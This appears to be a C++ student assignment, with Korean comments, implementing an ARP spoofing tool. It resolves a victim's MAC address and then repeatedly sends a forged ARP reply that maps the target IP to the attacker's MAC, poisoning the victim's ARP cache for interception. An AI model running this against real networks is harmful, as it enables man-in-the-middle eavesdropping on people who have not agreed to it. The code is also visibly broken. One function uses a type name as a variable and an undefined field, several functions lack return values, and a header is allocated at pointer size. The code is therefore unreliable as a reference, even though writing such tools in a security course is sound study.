#include "header.h"
#include <iostream>
using namespace std;

int main(int argc, char *argv[]) {

	/*인자를 4개 받지 않으면 에러를 띄워준다.*/

	if (argc != 4) {
		printf("Wrong format !!!\n=================\n ./sendArp dev senderip targetip\n=================\n");
	}

	/*받은 인자 순서에 따라 변수에 할당해준다.*/

	const char *dev = argv[1];
	const char *senderIpChar = (const char *)argv[2];
	const char *targetIpChar = (const char *)argv[3];

	/* Local Mac 주소를 받아오는 함수를 사용하여 local mac을 받아온다. 
	필요에 의해 사용은 하지만, SOCKET부분에 대한 이해가 필요해 보인다.*/

	u_int8_t *localMac = (u_int8_t*)malloc(sizeof(u_int8_t) *MACADDRESSLENGTH);
	GetLocalMac(dev, localMac);

	/* 내가 찾아야하는 모르는 맥 주소 값을 0xFFFFFFFF으로 둔다.*/

	u_int8_t* nullMac = (u_int8_t*)malloc(sizeof(u_int8_t) * MACADDRESSLENGTH);
	for (int i = 0; i < MACADDRESSLENGTH; i++) {
		
		nullMac[i] = 0xFF;

	}

	/* char 값으로 저장되어있는 ip를 처리하기 위해서는 int값으로 바꿔야하기 때문에 
	변수를 먼저 선언해준다.*/

	u_int32_t senderIp;
	u_int32_t targetIp;

	/* 미리 만들어 둔 IpCharToUnint 함수를 활용하여 자료형을 바꿔서 값을 저장해준다.*/

	IpCharToUnint(senderIpChar, &senderIp);
	IpCharToUnint(targetIpChar, &targetIp);

	/* pcap test때 사용하던 handle open부분을 인용한다. 실시간으로 패킷을 캡쳐한다.*/

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s : %s\n", dev, errbuf);
	}

	/*Part 1 Sending ARP Request */

	printf("=========================\n");
	printf("Now, Sending ARP Requset to Sender by attacker\n");
	printf("=========================\n");
	ethernetHeader *ethernetHost = GenerateEthernetHeader(
		nullMac,				/* ethernetDestinationMacAddress */
		localMac, 				/* ethernetSourceMacAddress */
		ARP);	  				/* ethernetType */

	arpHeader* arpHost = GenerateArpHeader(
		ETHERNET, 		 		/* arpHardwareAddressType */
		IPV4,	 		 		/*arpProtocolAddressType */
		HARDWARELENGTH,	 				/* arpHardwareAddressLength */
		PROTOCOLLENGTH,	 				/* arpProtocolAddressLength */
		REQUEST,   				/* arpOperation */
		localMac, 				/* arpSourceMacAddress[MACADDRESSLENGTH] */
		targetIp,
		//		arpSourceIPAddress,			/* arpSourceIPAddress : doenst' matter what it is*/
		nullMac,				/* arpDestinationMacAddress */
		senderIp);  				/* arpDestinationIPAddress */

	htonEthernet(ethernetHost);
	htonArp(arpHost);
	printPacket(ethernetHost, arpHost);

	/* Part2 Receive ARP Reply*/

	printf("=========================\n");
	printf("Now, Receiving ARP Reply by Sender\n");
	printf("=========================\n");

	u_int8_t temporaryMac[MACADDRESSLENGTH] = {
		0,
	};

	/* set ethernet_h->ether_shost to received mac address */
	while ((receiveReply(handle, senderIp, temporaryMac) != 1))
	{
		sendPacket(handle, ethernetHost, arpHost);
	}

	/* Part3 Making ARP Request Packet*/

	printf("=========================\n");
	printf("Now, Making ARP Request Packet\n");
	printf("=========================\n");
	while ((receiveReply(handle, senderIp, temporaryMac) != 1))
	{
		sendPacket(handle, ethernetHost, arpHost);
	}
	ethernetHeader* ReverseEthernetHost = GenerateEthernetHeader(
		temporaryMac,  				/* ethernetDestinationMacAddress */
		localMac, 				/* ethernetSourceMacAddress */
		ARP);	 				/* ethernetType */
	arpHeader* ReverseArpHost = GenerateArpHeader(
		ETHERNET, 				/* arpHardwareAddressType */
		IPV4,	  				/* arpProtocolAddressType */
		HARDWARELENGTH,	 				/* arpHardwareAddressLength */
		PROTOCOLLENGTH,	 				/* arpProtocolAddressLength */
		REPLY,	 				/* arpOperation */
		localMac, 				/* arpSourceMacAddress */
		targetIp,   				/* arpSourceIPAddress */
		temporaryMac,  				/* arpDestinationMacAddress */
		senderIp);   				/* arpDestinationIPAddress */
	htonEthernet(ReverseEthernetHost);
	htonArp(ReverseArpHost);
	printPacket(ReverseEthernetHost, ReverseArpHost);

	/* Part4 Receive ARP Request*/

	printf("=========================\n");
	printf("Now, Receiving ARP Reply by Sender\n");
	printf("=========================\n");

	while ((receiveRequest(handle, senderIp) != 1))
	{
		sendPacket(handle, ReverseEthernetHost, ReverseArpHost);
	}

	return 0;
}
int GetLocalMac(const char* dev, u_int8_t* mac) //this is function that get local MAC address                                                                       
{
	struct ifreq ifr; // this is linux function needs dev name, In this function, there are many functionality.
	int fd; // socketfunction results will be put in this variable.
	int rv; // return value - error value from df or ioctl call

	/* determine the local MAC address */
	strcpy(ifr.ifr_name, dev); //strcpy(a, b) needs lib(<cstdio> or <stdio.h>)) and cotent b will be copied into a.  
	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP); //socket function.
	if (fd < 0) // if sockerfunction return <0, there is the error. 
		rv = fd; // return error
	else
	{
		rv = ioctl(fd, SIOCGIFHWADDR, &ifr); // ioctl function is hard.
		if (rv >= 0) /* worked okay */
			memcpy(mac, ifr.ifr_hwaddr.sa_data, IFHWADDRLEN);//ifr.ifr_hwaddr.sa_data 중IFHWADDRLEN만큼을 mac에 복사해라
	}

	return rv;
}

int receiveReply(pcap_t* handle, u_int32_t arpSourceIPAddress, u_int8_t* ethernetSourceMacAddress)
{
	const u_char* packet;
	int rv = -1;

	struct pcap_pkthdr* header;
	int res = pcap_next_ex(handle, &header, &packet);
	ethernetHeader* ethernetHost = (ethernetHeader*)malloc(sizeof(ethernetHeader));
	ethernetHost = (ethernetHeader*)packet;

	if (ntohs(ethernetHost->ethernetType) == ARP)
	{		
		arpHeader* arpHost = (arpHeader*)malloc(sizeof(arpHeader));
		arpHost = (arpHeader*)(packet + sizeof(ethernetHeader));
		if (ntohs(arpHost->arpOperation) == REPLY)
		{
			/* compare ip address */
			if (ntohl(arpHost->arpSourceIPAddress) == arpSourceIPAddress)
			{
				for (int i = 0; i < MACADDRESSLENGTH; i++)
				{
					ethernetSourceMacAddress[i] = *(reverseArray(arpHost->arpSourceMacAddress) + i);
				}
				//print_packet((ethernet_hdr *)packet, (arp_hdr *)(packet + 14));
				return 1;
			}
		}
	}
}

int receiveRequest(pcap_t* handle, u_int32_t arpSourceIPAddress)
{
	const u_char* packet;
	int rv = -1;

	struct pcap_pkthdr* header;

	int res = pcap_next_ex(handle, &header, &packet);
	ethernetHeader* ethernetHost = (ethernetHeader*)malloc(sizeof(ethernetHeader));
	ethernetHost = (ethernetHeader*)packet;

	if (ntohs(ethernetHost->ethernetType) == ARP)
	{
		arpHeader* arpHost = (arpHeader*)malloc(sizeof(arpHeader));
		arpHost = (arpHeader*)(packet + sizeof(ethernetHeader));
		if (ntohs(arpHeader->arpOperation) == REQUEST)
		{
			/* compare ip address */
			if (ntohl(arpHost->ar_src_ip) == arpSourceIPAddress)
			{
				return 1;
			}
		}
	}
}

void sendPacket(pcap_t* handle, ethernetHeader* ethernetHost, arpHeader* arpHost)
{

	u_char* packet;
	int packet_size = sizeof(ethernetHeader) + sizeof(arpHeader);

	packet = (u_char*)malloc(sizeof(u_char) * packet_size);
	memcpy(packet, ethernetHost, sizeof(ethernetHeader));
	memcpy(packet + sizeof(ethernetHeader), arpHost, sizeof(arpHeader));
	if (pcap_sendpacket(handle, packet, packet_size) != 0)
	{
		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(handle));
	}
}

u_int8_t* reverseArray(u_int8_t* uintArray)
{
	u_int8_t* temp = (u_int8_t*)malloc(sizeof(u_int8_t) * (MACADDRESSLENGTH));
	u_int8_t* p = uintArray + (MACADDRESSLENGTH - 1);

	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		*(temp + i) = *(p - i);
	}
	return temp;
}

void IpCharToUnint(const char *charIp, u_int32_t *intIp)
{/*IP값을 4바이트씩 받을 byte 정의*/
	u_int32_t byte3; 
	u_int32_t byte2;
	u_int32_t byte1;
	u_int32_t byte0;
	/*형 변환을 할 때 IP인자 값 끝에 dummy string이 있다고 생각하고
	받을 공간을 확보해둡니다.*/
	char nullString[2]; 

	/* str문자열에서 format형식으로 데이터를 읽어서 가변인자들이 가리키는 메모리에 각각 저장
		합니다. 그래서 dummystring에서는 1글자만 읽고 마칩니다. 널문자 삽입.
		문자열의 끝을 알려줌. */
	if (sscanf(charIp, "%u.%u.%u.%u%1s",
		&byte3, &byte2, &byte1, &byte0, nullString) == 4)
	{
		/* 받은 인자들을 IP 순서대로 정렬해줍니다.*/

		if ((byte0 < 256) && (byte1 < 256) && (byte2 < 256) && (byte3 < 256))
		{
			*intIp = byte0 + (byte1 << 8) + (byte2 << 16) + (byte3 << 24);
		}
	}
}

void printPacket(ethernetHeader* ethernetHost, arpHeader* arpHost)
{

	/* 이더넷 헤더 출력 */
	printf("\n\n[ETHERNET HEADER]\n");
	printf("Destination MAC : "); 
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		printf("%02x ", *(ethernetHost->ethernetDestinationMacAddress + i));
	}
	printf("\nSource MAC : ");
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		printf("%02x ", *(ethernetHost->ethernetSourceMacAddress + i));
	}
	printf("\nEther Type : ");
	printf("%02x", ethernetHost->ethernetType);

	/* ARP header 출력 */
	printf("\n[ARP HEADER]\n");
	printf("arpHardwareAddressType  : %04x\n", arpHost->arpHardwareAddressType);
	printf("arpProtocolAddressType  : %04x\n", arpHost->arpProtocolAddressType);
	printf("arpHardwareAddressLength  : %02x\n", arpHost->arpHardwareAddressLength);
	printf("arpProtocolAddressLength  : %02x\n", arpHost->arpProtocolAddressLength);
	printf("OP code  : %04x\n", arpHost->arpOperation);

	printf("Source MAC : ");
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		printf("%02x ", *(arpHost->arpSourceMacAddress + i));
	}
	printf("\nSource IP : ");
	printf("%0x\n", arpHost->arpSourceIPAddress);
	printf("Destination MAC : ");
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		printf("%02x ", *(arpHost->arpDestinationMacAddress + i));
	}
	printf("\nDestination IP : ");
	printf("%0x", arpHost->arpDestinationIPAddress);
}


void htonArp(arpHeader* arpHost)
{
	arpHost->arpHardwareAddressType = htons(arpHost->arpHardwareAddressType);
	arpHost->arpProtocolAddressType = htons(arpHost->arpProtocolAddressType);
	arpHost->arpHardwareAddressLength = arpHost->arpHardwareAddressLength;
	arpHost->arpProtocolAddressLength = arpHost->arpProtocolAddressLength;
	arpHost->arpOperation = htons(arpHost->arpOperation);
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		arpHost->arpSourceMacAddress[i] = *(reverseArray(arpHost->arpSourceMacAddress) + i);
		arpHost->arpDestinationMacAddress[i] = *(reverseArray(arpHost->arpDestinationMacAddress) + i);
	}
	arpHost->arpSourceIPAddress = htonl(arpHost->arpSourceIPAddress);
	arpHost->arpDestinationIPAddress = htonl(arpHost->arpDestinationIPAddress);
}

void htonEthernet(ethernetHeader* ethernetHost)
{

	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		ethernetHost->ethernetDestinationMacAddress[i] = *(reverseArray(ethernetHost->ethernetDestinationMacAddress) + i);
		ethernetHost->ethernetSourceMacAddress[i] = *(reverseArray(ethernetHost->ethernetSourceMacAddress) + i);
	}
	ethernetHost->ethernetType = htons(ethernetHost->ethernetType);
}

arpHeader* GenerateArpHeader(u_int16_t arpHardwareAddressType, u_int16_t arpProtocolAddressType, u_int8_t arpHardwareAddressLength, u_int8_t arpProtocolAddressLength, u_int16_t arpOperation, u_int8_t* arpSourceMacAddress, u_int32_t arpSourceIPAddress, u_int8_t* arpDestinationMacAddress, u_int32_t arpDestinationIPAddress)
{
	arpHeader* arpHost = (arpHeader*)malloc(sizeof(arpHeader));

	arpHost->arpHardwareAddressType = arpHardwareAddressType;
	arpHost->arpProtocolAddressType = arpProtocolAddressType;
	arpHost->arpHardwareAddressLength = arpHardwareAddressLength;
	arpHost->arpProtocolAddressLength = arpProtocolAddressLength;
	arpHost->arpOperation = arpOperation;
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		arpHost->arpSourceMacAddress[i] = *(arpSourceMacAddress + i);
		arpHost->arpDestinationMacAddress[i] = *(arpDestinationMacAddress + i);
	}
	arpHost->arpSourceIPAddress = arpSourceIPAddress;
	arpHost->arpDestinationIPAddress = arpDestinationIPAddress;
	return arpHost;
}


ethernetHeader* GenerateEthernetHeader(u_int8_t* ethernetDestinationMacAddress, u_int8_t* ethernetSourceMacAddress, u_int16_t ethernetType)
{
	ethernetHeader* ethernetHost = (ethernetHeader*)(malloc(sizeof(ethernetHost)));
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		ethernetHost->ethernetDestinationMacAddress[i] = *(ethernetDestinationMacAddress + i);
		ethernetHost->ethernetSourceMacAddress[i] = *(ethernetSourceMacAddress + i);
	}
	ethernetHost->ethernetType = ethernetType;
	return ethernetHost;
}